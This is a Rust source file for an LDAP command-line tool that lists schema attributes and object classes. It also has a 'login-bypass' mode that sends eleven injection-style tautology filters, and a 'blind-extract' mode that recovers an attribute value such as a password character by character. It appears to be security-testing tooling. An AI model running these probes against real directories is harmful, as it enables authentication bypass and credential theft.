use anyhow::{Context, Result};
use clap::{Parser, ValueEnum};
use ldap3::{Ldap, LdapConnAsync, LdapConnSettings, Scope, SearchEntry};
use serde::Serialize;
use std::collections::HashMap;

#[derive(Parser, Debug)]
#[command(
    name = "ldapin",
    about = "Discover valid LDAP fields from a server's schema",
    version
)]
struct Args {
    /// LDAP server URL (e.g. ldap://localhost:389 or ldaps://host:636)
    #[arg(short = 'H', long, default_value = "ldap://localhost:389")]
    host: String,

    /// Bind DN for authentication (anonymous bind if omitted)
    #[arg(short = 'D', long)]
    bind_dn: Option<String>,

    /// Bind password (use -W to prompt interactively)
    #[arg(short = 'w', long, conflicts_with = "prompt_password")]
    password: Option<String>,

    /// Prompt for bind password interactively
    #[arg(short = 'W', long)]
    prompt_password: bool,

    /// Filter results by name or description (substring match)
    #[arg(short = 'f', long)]
    filter: Option<String>,

    /// Show only the named object class entry (with --mode object-classes)
    #[arg(short = 'c', long = "object-class")]
    object_class: Option<String>,

    /// What to show: attributes, object-classes, or both
    #[arg(short = 'm', long, default_value = "attributes")]
    mode: ShowMode,

    /// Output format
    #[arg(short = 'o', long, default_value = "table")]
    output: OutputFormat,

    /// Use STARTTLS to upgrade the connection
    #[arg(long)]
    starttls: bool,

    /// Accept invalid TLS certificates (insecure)
    #[arg(long)]
    insecure: bool,

    /// Base DN to search under (required for --mode login-bypass)
    #[arg(short = 'b', long)]
    base_dn: Option<String>,

    /// User attribute name for login-bypass probes
    #[arg(long, default_value = "uid")]
    user_attr: String,

    /// Password attribute name for login-bypass probes
    #[arg(long, default_value = "userPassword")]
    pass_attr: String,

    /// Target username for login-bypass probes (tests wildcard/any-user payloads when omitted)
    #[arg(short = 'u', long)]
    target_user: Option<String>,

    /// Attribute whose value to extract character-by-character (--mode blind-extract)
    #[arg(long)]
    extract_attr: Option<String>,

    /// Character set to try during blind extraction [default: a-z A-Z 0-9 and common symbols]
    #[arg(long)]
    charset: Option<String>,
}

#[derive(ValueEnum, Clone, Debug)]
enum ShowMode {
    Attributes,
    #[value(name = "object-classes")]
    ObjectClasses,
    Both,
    #[value(name = "login-bypass")]
    LoginBypass,
    #[value(name = "blind-extract")]
    BlindExtract,
}

#[derive(ValueEnum, Clone, Debug)]
enum OutputFormat {
    Table,
    Json,
    Csv,
}

#[derive(Debug, Serialize)]
struct AttributeInfo {
    name: String,
    oid: String,
    description: String,
    syntax: String,
    single_value: bool,
    aliases: Vec<String>,
}

#[derive(Debug, Serialize)]
struct ObjectClassInfo {
    name: String,
    oid: String,
    description: String,
    kind: String,
    must: Vec<String>,
    may: Vec<String>,
    sup: Vec<String>,
}

#[derive(Debug, Serialize)]
struct BypassResult {
    payload: String,
    description: String,
    filter: String,
    vulnerable: bool,
    entries_returned: usize,
    matched_dns: Vec<String>,
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    let password = if args.prompt_password {
        Some(rpassword::prompt_password("Bind password: ")?)
    } else {
        args.password.clone()
    };

    let mut ldap = connect(&args).await?;

    if let Some(dn) = &args.bind_dn {
        let pw = password.as_deref().unwrap_or("");
        ldap.simple_bind(dn, pw)
            .await?
            .success()
            .context("LDAP bind failed")?;
    }

    match args.mode {
        ShowMode::LoginBypass => {
            let base_dn = args
                .base_dn
                .as_deref()
                .context("--base-dn is required for --mode login-bypass")?;
            let results = test_login_bypass(
                &mut ldap,
                base_dn,
                &args.user_attr,
                &args.pass_attr,
                args.target_user.as_deref(),
            )
            .await?;
            print_bypass_results(results, &args.output)?;
            ldap.unbind().await?;
            return Ok(());
        }
        ShowMode::BlindExtract => {
            let base_dn = args
                .base_dn
                .as_deref()
                .context("--base-dn is required for --mode blind-extract")?;
            let target = args
                .target_user
                .as_deref()
                .context("--target-user is required for --mode blind-extract")?;
            let extract_attr = args
                .extract_attr
                .as_deref()
                .context("--extract-attr is required for --mode blind-extract")?;
            let charset = args.charset.as_deref().unwrap_or(DEFAULT_CHARSET);
            let value = blind_extract(
                &mut ldap,
                base_dn,
                &args.user_attr,
                target,
                extract_attr,
                charset,
                &args.output,
            )
            .await?;
            match args.output {
                OutputFormat::Json => {
                    println!(
                        "{}",
                        serde_json::to_string_pretty(&serde_json::json!({
                            "target_user": target,
                            "extract_attr": extract_attr,
                            "value": value,
                        }))?
                    );
                }
                OutputFormat::Csv => {
                    println!("target_user,extract_attr,value");
                    println!("{},{},{}", csv_esc(target), csv_esc(extract_attr), csv_esc(&value));
                }
                OutputFormat::Table => {
                    println!("\nExtracted {extract_attr} = {value:?}");
                }
            }
            ldap.unbind().await?;
            return Ok(());
        }
        _ => {}
    }

    let schema_dn = find_schema_dn(&mut ldap).await?;

    match args.mode {
        ShowMode::Attributes => {
            let attrs = fetch_attribute_types(&mut ldap, &schema_dn).await?;
            let filtered = filter_attrs(attrs, &args);
            print_attributes(filtered, &args.output)?;
        }
        ShowMode::ObjectClasses => {
            let ocs = fetch_object_classes(&mut ldap, &schema_dn).await?;
            let filtered = filter_ocs(ocs, &args);
            print_object_classes(filtered, &args.output)?;
        }
        ShowMode::Both => {
            let attrs = fetch_attribute_types(&mut ldap, &schema_dn).await?;
            let filtered_attrs = filter_attrs(attrs, &args);
            let ocs = fetch_object_classes(&mut ldap, &schema_dn).await?;
            let filtered_ocs = filter_ocs(ocs, &args);
            if !matches!(args.output, OutputFormat::Json) {
                println!("=== Attribute Types ({}) ===", filtered_attrs.len());
            }
            print_attributes(filtered_attrs, &args.output)?;
            if !matches!(args.output, OutputFormat::Json) {
                println!("\n=== Object Classes ({}) ===", filtered_ocs.len());
            }
            print_object_classes(filtered_ocs, &args.output)?;
        }
        ShowMode::LoginBypass | ShowMode::BlindExtract => unreachable!(),
    }

    ldap.unbind().await?;
    Ok(())
}

async fn connect(args: &Args) -> Result<Ldap> {
    let settings = LdapConnSettings::new()
        .set_starttls(args.starttls)
        .set_no_tls_verify(args.insecure);

    let (conn, ldap) = LdapConnAsync::with_settings(settings, &args.host)
        .await
        .with_context(|| format!("Cannot connect to {}", args.host))?;

    ldap3::drive!(conn);
    Ok(ldap)
}

async fn find_schema_dn(ldap: &mut Ldap) -> Result<String> {
    let (entries, _res) = ldap
        .search(
            "",
            Scope::Base,
            "(objectClass=*)",
            vec!["subschemaSubentry"],
        )
        .await?
        .success()
        .context("Root DSE query failed")?;

    let entry = entries
        .into_iter()
        .next()
        .context("Empty root DSE response")?;
    let entry = SearchEntry::construct(entry);

    Ok(entry
        .attrs
        .get("subschemaSubentry")
        .and_then(|v| v.first())
        .map(|s| s.to_owned())
        .unwrap_or_else(|| "cn=schema".to_owned()))
}

async fn fetch_attribute_types(ldap: &mut Ldap, schema_dn: &str) -> Result<Vec<AttributeInfo>> {
    let (entries, _res) = ldap
        .search(
            schema_dn,
            Scope::Base,
            "(objectClass=subschema)",
            vec!["attributeTypes"],
        )
        .await?
        .success()
        .context("Schema query failed")?;

    let entry = entries
        .into_iter()
        .next()
        .context("No schema entry found")?;
    let entry = SearchEntry::construct(entry);

    let raw = entry
        .attrs
        .get("attributeTypes")
        .cloned()
        .unwrap_or_default();

    let mut attrs: Vec<AttributeInfo> = raw
        .iter()
        .filter_map(|s| parse_attribute_type(s))
        .collect();
    attrs.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
    Ok(attrs)
}

async fn fetch_object_classes(ldap: &mut Ldap, schema_dn: &str) -> Result<Vec<ObjectClassInfo>> {
    let (entries, _res) = ldap
        .search(
            schema_dn,
            Scope::Base,
            "(objectClass=subschema)",
            vec!["objectClasses"],
        )
        .await?
        .success()
        .context("Schema query failed")?;

    let entry = entries
        .into_iter()
        .next()
        .context("No schema entry found")?;
    let entry = SearchEntry::construct(entry);

    let raw = entry
        .attrs
        .get("objectClasses")
        .cloned()
        .unwrap_or_default();

    let mut ocs: Vec<ObjectClassInfo> = raw
        .iter()
        .filter_map(|s| parse_object_class(s))
        .collect();
    ocs.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
    Ok(ocs)
}

async fn test_login_bypass(
    ldap: &mut Ldap,
    base_dn: &str,
    user_attr: &str,
    pass_attr: &str,
    target_user: Option<&str>,
) -> Result<Vec<BypassResult>> {
    let u = user_attr;
    let p = pass_attr;
    let t = target_user.unwrap_or("*");

    // (short name, description, filter)
    let payloads: Vec<(&str, &str, String)> = vec![
        (
            "wildcard-both",
            "Wildcard in both user and password fields",
            format!("(&({u}=*)({p}=*))"),
        ),
        (
            "wildcard-password",
            "Exact user, wildcard password",
            format!("(&({u}={t})({p}=*))"),
        ),
        (
            "negate-password",
            "Exact user, negate a false password predicate (always true)",
            format!("(&({u}={t})(!({p}=void)))"),
        ),
        (
            "or-always-true",
            "OR of any-user with target — short-circuits to true",
            format!("(|({u}=*)({u}={t}))"),
        ),
        (
            "double-or-inject",
            "Double OR tautology — common payload: uid=*)(|(uid=*",
            format!("(|({u}=*)({u}=*))"),
        ),
        (
            "and-tautology",
            "AND with a tautological sub-expression on the password field",
            format!("(&({u}={t})(|({p}=*)({p}=*)))"),
        ),
        (
            "objectclass-wildcard",
            "Any entry matching user attribute with wildcard objectClass",
            format!("(&({u}=*)(objectClass=*))"),
        ),
        (
            "not-nonexistent",
            "NOT of a filter that is always false",
            format!("(!(&({u}=__ldapin_nonexistent__)))"),
        ),
        (
            "empty-password",
            "Password attribute present but bound to an empty string",
            format!("(&({u}={t})({p}=))"),
        ),
        (
            "wildcard-user-prefix",
            "Prefix wildcard on the username (e.g. adm*)",
            format!("(&({u}={t}*)({p}=*))"),
        ),
        (
            "bare-user-wildcard",
            "Bare search for any entry carrying the user attribute",
            format!("({u}=*)"),
        ),
    ];

    let mut results = Vec::new();

    for (name, description, filter) in payloads {
        let outcome = ldap
            .search(base_dn, Scope::Subtree, &filter, vec!["dn"])
            .await;

        let (vulnerable, entries_returned, matched_dns) = match outcome {
            Ok(res) => match res.success() {
                Ok((entries, _)) => {
                    let dns: Vec<String> = entries
                        .iter()
                        .map(|e| SearchEntry::construct(e.clone()).dn)
                        .collect();
                    let count = dns.len();
                    (count > 0, count, dns)
                }
                Err(_) => (false, 0, vec![]),
            },
            Err(_) => (false, 0, vec![]),
        };

        results.push(BypassResult {
            payload: name.to_owned(),
            description: description.to_owned(),
            filter,
            vulnerable,
            entries_returned,
            matched_dns,
        });
    }

    Ok(results)
}

fn print_bypass_results(results: Vec<BypassResult>, fmt: &OutputFormat) -> Result<()> {
    match fmt {
        OutputFormat::Table => {
            use comfy_table::{presets::UTF8_FULL, Cell, Color, Table};
            let mut table = Table::new();
            table.load_preset(UTF8_FULL);
            table.set_header(["Payload", "Vulnerable", "Entries", "Filter", "Description"]);
            for r in &results {
                let vuln_cell = if r.vulnerable {
                    Cell::new("YES").fg(Color::Red)
                } else {
                    Cell::new("no").fg(Color::Green)
                };
                table.add_row(vec![
                    Cell::new(&r.payload),
                    vuln_cell,
                    Cell::new(r.entries_returned.to_string()),
                    Cell::new(&r.filter),
                    Cell::new(&r.description),
                ]);
            }
            println!("{table}");
            let hits: usize = results.iter().filter(|r| r.vulnerable).count();
            if hits > 0 {
                println!("\n{hits}/{} payloads returned entries.", results.len());
            } else {
                println!("\nNo payloads returned entries.");
            }
        }
        OutputFormat::Json => {
            println!("{}", serde_json::to_string_pretty(&results)?);
        }
        OutputFormat::Csv => {
            println!("payload,vulnerable,entries_returned,filter,description,matched_dns");
            for r in &results {
                println!(
                    "{},{},{},\"{}\",\"{}\",\"{}\"",
                    csv_esc(&r.payload),
                    r.vulnerable,
                    r.entries_returned,
                    r.filter.replace('"', "\"\""),
                    r.description.replace('"', "\"\""),
                    r.matched_dns.join("|").replace('"', "\"\""),
                );
            }
        }
    }
    Ok(())
}

const DEFAULT_CHARSET: &str =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._!@#$%^&*()-+=";

/// Escape characters that have special meaning inside an LDAP filter value.
fn ldap_escape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '*' => out.push_str("\\2a"),
            '(' => out.push_str("\\28"),
            ')' => out.push_str("\\29"),
            '\\' => out.push_str("\\5c"),
            '\0' => out.push_str("\\00"),
            other => out.push(other),
        }
    }
    out
}

/// Extract the value of `extract_attr` for the entry identified by
/// `(&(user_attr=target)(extract_attr=PREFIX*))` one character at a time.
async fn blind_extract(
    ldap: &mut Ldap,
    base_dn: &str,
    user_attr: &str,
    target: &str,
    extract_attr: &str,
    charset: &str,
    output: &OutputFormat,
) -> Result<String> {
    let mut known = String::new();
    let live = matches!(output, OutputFormat::Table);

    if live {
        eprintln!(
            "Blind-extracting {extract_attr} for {user_attr}={target} under {base_dn}"
        );
        eprintln!("Charset: {} chars", charset.chars().count());
        eprint!("Value: ");
    }

    loop {
        let mut found = false;

        for ch in charset.chars() {
            let candidate = format!("{}{}", known, ch);
            let filter = format!(
                "(&({}={})({}={}*))",
                user_attr,
                ldap_escape(target),
                extract_attr,
                ldap_escape(&candidate),
            );

            let hit = ldap
                .search(base_dn, Scope::Subtree, &filter, vec!["dn"])
                .await
                .ok()
                .and_then(|r| r.success().ok())
                .map(|(entries, _)| !entries.is_empty())
                .unwrap_or(false);

            if hit {
                known.push(ch);
                if live {
                    eprint!("{ch}");
                }
                found = true;
                break;
            }
        }

        if !found {
            break;
        }
    }

    if live {
        eprintln!();
    }

    Ok(known)
}

fn parse_attribute_type(s: &str) -> Option<AttributeInfo> {
    let oid = extract_oid(s)?;
    let names = extract_names(s);
    let name = names.first().cloned().unwrap_or_else(|| oid.clone());
    let aliases = names.into_iter().skip(1).collect();
    let description = extract_quoted(s, "DESC").unwrap_or_default();
    let syntax = extract_syntax(s);
    let single_value = s.contains(" SINGLE-VALUE");

    Some(AttributeInfo {
        name,
        oid,
        description,
        syntax,
        single_value,
        aliases,
    })
}

fn parse_object_class(s: &str) -> Option<ObjectClassInfo> {
    let oid = extract_oid(s)?;
    let names = extract_names(s);
    let name = names.first().cloned().unwrap_or_else(|| oid.clone());
    let description = extract_quoted(s, "DESC").unwrap_or_default();

    let kind = if s.contains(" ABSTRACT") {
        "ABSTRACT"
    } else if s.contains(" AUXILIARY") {
        "AUXILIARY"
    } else {
        "STRUCTURAL"
    }
    .to_owned();

    let sup = extract_list_field(s, "SUP");
    let must = extract_list_field(s, "MUST");
    let may = extract_list_field(s, "MAY");

    Some(ObjectClassInfo {
        name,
        oid,
        description,
        kind,
        must,
        may,
        sup,
    })
}

fn extract_oid(s: &str) -> Option<String> {
    let trimmed = s.trim().trim_start_matches('(').trim();
    let oid: String = trimmed.chars().take_while(|c| !c.is_whitespace()).collect();
    if oid.is_empty() { None } else { Some(oid) }
}

fn extract_names(s: &str) -> Vec<String> {
    if let Some(pos) = s.find(" NAME ") {
        let rest = &s[pos + 6..];
        if rest.starts_with('\'') {
            return extract_single_quoted(rest).into_iter().collect();
        } else if rest.starts_with('(') {
            return extract_parenthesized_names(rest);
        }
    }
    vec![]
}

fn extract_single_quoted(s: &str) -> Option<String> {
    let s = s.trim_start_matches('\'');
    let end = s.find('\'')?;
    Some(s[..end].to_owned())
}

fn extract_parenthesized_names(s: &str) -> Vec<String> {
    let inner_start = match s.find('(') {
        Some(p) => p + 1,
        None => return vec![],
    };
    let inner_end = match s.find(')') {
        Some(p) => p,
        None => return vec![],
    };
    if inner_start > inner_end {
        return vec![];
    }
    let inner = &s[inner_start..inner_end];
    inner
        .split('\'')
        .filter(|p| !p.trim().is_empty())
        .filter(|p| p.chars().any(|c| c.is_alphanumeric()))
        .map(|p| p.trim().to_owned())
        .collect()
}

fn extract_quoted(s: &str, keyword: &str) -> Option<String> {
    let needle = format!(" {} '", keyword);
    let pos = s.find(&needle)?;
    let rest = &s[pos + needle.len()..];
    let end = rest.find('\'')?;
    Some(rest[..end].to_owned())
}

fn extract_syntax(s: &str) -> String {
    if let Some(pos) = s.find(" SYNTAX ") {
        let rest = &s[pos + 8..];
        let syntax: String = rest
            .chars()
            .take_while(|c| !c.is_whitespace() && *c != ')')
            .collect();
        let syntax = syntax.split('{').next().unwrap_or(&syntax).to_owned();
        return map_syntax_oid(&syntax);
    }
    String::new()
}

fn map_syntax_oid(oid: &str) -> String {
    let known: HashMap<&str, &str> = [
        ("1.3.6.1.4.1.1466.115.121.1.5", "Binary"),
        ("1.3.6.1.4.1.1466.115.121.1.7", "Boolean"),
        ("1.3.6.1.4.1.1466.115.121.1.8", "Certificate"),
        ("1.3.6.1.4.1.1466.115.121.1.9", "Certificate List"),
        ("1.3.6.1.4.1.1466.115.121.1.10", "Certificate Pair"),
        ("1.3.6.1.4.1.1466.115.121.1.11", "Country String"),
        ("1.3.6.1.4.1.1466.115.121.1.12", "Distinguished Name"),
        ("1.3.6.1.4.1.1466.115.121.1.15", "Directory String"),
        ("1.3.6.1.4.1.1466.115.121.1.22", "Facsimile Telephone Number"),
        ("1.3.6.1.4.1.1466.115.121.1.24", "Generalized Time"),
        ("1.3.6.1.4.1.1466.115.121.1.26", "IA5 String"),
        ("1.3.6.1.4.1.1466.115.121.1.27", "Integer"),
        ("1.3.6.1.4.1.1466.115.121.1.28", "JPEG"),
        ("1.3.6.1.4.1.1466.115.121.1.34", "Name And Optional UID"),
        ("1.3.6.1.4.1.1466.115.121.1.36", "Numeric String"),
        ("1.3.6.1.4.1.1466.115.121.1.38", "OID"),
        ("1.3.6.1.4.1.1466.115.121.1.40", "Octet String"),
        ("1.3.6.1.4.1.1466.115.121.1.41", "Postal Address"),
        ("1.3.6.1.4.1.1466.115.121.1.50", "Telephone Number"),
        ("1.3.6.1.4.1.1466.115.121.1.53", "UTC Time"),
    ]
    .into_iter()
    .collect();

    known
        .get(oid)
        .map(|s| s.to_string())
        .unwrap_or_else(|| oid.to_owned())
}

fn extract_list_field(s: &str, keyword: &str) -> Vec<String> {
    let needle = format!(" {} ", keyword);
    let pos = match s.find(&needle) {
        Some(p) => p,
        None => return vec![],
    };
    let rest = &s[pos + needle.len()..];
    if rest.starts_with('(') {
        extract_parenthesized_names(rest)
    } else {
        let val: String = rest
            .chars()
            .take_while(|c| !c.is_whitespace() && *c != ')')
            .collect();
        if val.is_empty() { vec![] } else { vec![val] }
    }
}


fn filter_attrs(attrs: Vec<AttributeInfo>, args: &Args) -> Vec<AttributeInfo> {
    attrs
        .into_iter()
        .filter(|a| {
            if let Some(f) = &args.filter {
                let f = f.to_lowercase();
                a.name.to_lowercase().contains(&f)
                    || a.aliases.iter().any(|al| al.to_lowercase().contains(&f))
                    || a.description.to_lowercase().contains(&f)
            } else {
                true
            }
        })
        .collect()
}

fn filter_ocs(ocs: Vec<ObjectClassInfo>, args: &Args) -> Vec<ObjectClassInfo> {
    ocs.into_iter()
        .filter(|o| {
            if let Some(f) = &args.filter {
                let f = f.to_lowercase();
                if !o.name.to_lowercase().contains(&f)
                    && !o.description.to_lowercase().contains(&f)
                {
                    return false;
                }
            }
            if let Some(oc) = &args.object_class {
                if !o.name.eq_ignore_ascii_case(oc) {
                    return false;
                }
            }
            true
        })
        .collect()
}

fn print_attributes(attrs: Vec<AttributeInfo>, fmt: &OutputFormat) -> Result<()> {
    match fmt {
        OutputFormat::Table => {
            use comfy_table::{presets::UTF8_FULL, Table};
            let mut table = Table::new();
            table.load_preset(UTF8_FULL);
            table.set_header(["Name", "OID", "Syntax", "Single", "Aliases", "Description"]);
            for a in &attrs {
                table.add_row([
                    a.name.as_str(),
                    a.oid.as_str(),
                    a.syntax.as_str(),
                    if a.single_value { "yes" } else { "no" },
                    &a.aliases.join(", "),
                    a.description.as_str(),
                ]);
            }
            println!("{table}");
        }
        OutputFormat::Json => {
            println!("{}", serde_json::to_string_pretty(&attrs)?);
        }
        OutputFormat::Csv => {
            println!("name,oid,syntax,single_value,aliases,description");
            for a in &attrs {
                println!(
                    "{},{},{},{},{},\"{}\"",
                    csv_esc(&a.name),
                    csv_esc(&a.oid),
                    csv_esc(&a.syntax),
                    a.single_value,
                    csv_esc(&a.aliases.join("|")),
                    a.description.replace('"', "\"\"")
                );
            }
        }
    }
    Ok(())
}

fn print_object_classes(ocs: Vec<ObjectClassInfo>, fmt: &OutputFormat) -> Result<()> {
    match fmt {
        OutputFormat::Table => {
            use comfy_table::{presets::UTF8_FULL, Table};
            let mut table = Table::new();
            table.load_preset(UTF8_FULL);
            table.set_header(["Name", "OID", "Kind", "SUP", "MUST", "MAY", "Description"]);
            for o in &ocs {
                table.add_row([
                    o.name.as_str(),
                    o.oid.as_str(),
                    o.kind.as_str(),
                    &o.sup.join(", "),
                    &o.must.join(", "),
                    &o.may.join(", "),
                    o.description.as_str(),
                ]);
            }
            println!("{table}");
        }
        OutputFormat::Json => {
            println!("{}", serde_json::to_string_pretty(&ocs)?);
        }
        OutputFormat::Csv => {
            println!("name,oid,kind,sup,must,may,description");
            for o in &ocs {
                println!(
                    "{},{},{},{},{},{},\"{}\"",
                    csv_esc(&o.name),
                    csv_esc(&o.oid),
                    csv_esc(&o.kind),
                    csv_esc(&o.sup.join("|")),
                    csv_esc(&o.must.join("|")),
                    csv_esc(&o.may.join("|")),
                    o.description.replace('"', "\"\"")
                );
            }
        }
    }
    Ok(())
}

fn csv_esc(s: &str) -> String {
    if s.contains(',') || s.contains('"') {
        format!("\"{}\"", s.replace('"', "\"\""))
    } else {
        s.to_owned()
    }
}
